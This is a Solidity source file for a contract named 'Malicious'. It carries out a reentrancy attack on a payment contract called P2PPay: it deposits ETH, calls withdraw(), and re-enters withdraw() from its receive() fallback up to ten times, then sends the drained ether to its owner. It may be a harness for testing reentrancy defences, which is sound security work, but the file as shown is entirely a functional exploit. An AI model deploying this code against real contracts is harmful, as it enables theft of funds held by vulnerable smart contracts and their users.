// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IP2PPay {
    function withdraw() external;
    function balanceOf(address who) external view returns (uint256);
}

contract Malicious {
    IP2PPay public target;
    address public owner;
    bool public reenter;
    uint256 public loopCount;

    constructor(address _target) {
        target = IP2PPay(_target);
        owner = msg.sender;
    }

    // Deposit helper - send ETH to P2PPay as payee = this contract
    function depositToTarget() external payable {
        // Note: call payTo on target with this contract as the payee
        (bool ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("payTo(address,bytes32)", address(this), bytes32(0)));
        require(ok, "deposit failed");
    }

    // Start attack: call withdraw() on target; fallback will attempt reentry
    function attackWithdraw() external {
        reenter = true;
        loopCount = 0;
        target.withdraw();
    }

    receive() external payable {
        if (reenter) {
            loopCount++;
            // If target still has a balance for this contract, reenter
            uint256 bal = target.balanceOf(address(this));
            if (bal > 0 && loopCount < 10) {
                // Attempt to reenter
                target.withdraw();
            } else {
                reenter = false;
                // forward to owner
                payable(owner).transfer(address(this).balance);
            }
        }
    }
}
